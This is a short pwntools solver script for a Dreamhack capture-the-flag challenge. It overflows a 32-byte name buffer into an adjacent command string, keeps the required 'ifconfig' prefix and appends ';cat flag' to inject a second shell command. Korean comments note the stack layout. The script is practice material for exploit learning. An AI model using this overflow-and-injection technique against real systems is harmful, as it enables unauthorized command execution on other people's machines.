#!/usr/bin/python3

import pwn

pwn.context.log_level = 'debug'
p = pwn.remote("host1.dreamhack.games", 21863)

original = "ifconfig"
spoof = ";cat flag"
prefix = "A"*32

payload = prefix
payload += original
payload += spoof

p.sendlineafter("Center name: ", payload)
p.interactive()

"""
0x7fffffffdc70 주소 : ifconfig 문자열이 저장되어 있으며 해당 값을 기본 명령으로 사용
0x7fffffffdc50 주소 : center_name 변수 주소
strncmp를 통해서 ifconfig 문자열이 없을 경우 프로그램 종료
"""
